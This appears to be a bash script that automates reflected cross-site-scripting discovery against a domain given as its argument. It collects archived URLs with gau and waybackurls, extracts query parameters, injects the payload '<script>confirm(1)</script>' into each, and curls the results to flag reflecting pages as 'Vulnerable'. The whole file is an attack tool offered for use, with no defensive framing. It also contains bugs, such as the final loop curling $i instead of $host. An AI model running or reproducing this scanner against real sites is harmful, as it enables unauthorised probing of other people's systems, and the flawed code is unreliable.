#!/bin/bash

echo -e "\033[32m
███████ ██ ██            ██    ██ ██████  ██
██      ██ ██            ██    ██ ██   ██ ██
█████   ██ ██      █████ ██    ██ ██████  ██
██      ██ ██            ██    ██ ██   ██ ██
██      ██ ███████        ██████  ██   ██ ███████

"
if [ ! -d targets ]; then
   mkdir targets
fi  
cd targets

if [ ! -d targets ]; then
   mkdir $1
fi
cd $1

if [ -f $1-xss ] ; then
    rm $(ls|grep $1)
fi

START=$(date +%s)
gau $1 --o $1-all-urls

END=$(date +%s)

timeexec=$(($END - $START))
echo  -e "\033[31m******************GAU Has taken $timeexec seconds from our life**********************\033[m"

waybackurls $1 |tee -a $1-all-urls|qsreplace|tee $1-all-urls
endtimes=$(date +%s)
timeexecs=$(($endtimes - $START))
echo -e "\033[32m*****************WAYBACKURLS has taken your time $timeexecs seconds********************\033[m"

cat $1-all-urls|grep "="|egrep -iv ".(css|jpg|gif|js|jpeg|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)"|qsreplace|cut -d "?" -f 2|egrep -iv http|sort -u|tee $1-param
sed  -i 's/&/\n/g' $1-param

for i in $(cat $1-param)
do
cat $1-all-urls |grep $i|head -n 1|tee -a $1-final
done
sort -u $1-final -o $1-final
echo -e "\033[31m=======================checing xss one liner==============================\033[m"
cat $1-final |qsreplace "<script>confirm(1)</script>"|tee $1-final
sort -u $1-final -o $1-final
for host in $(cat $1-final)
do
curl -s $i |grep -qs "<script>confirm(1)" && echo  -e "$host \033[31mVulnerable\n\033[m" ;
done

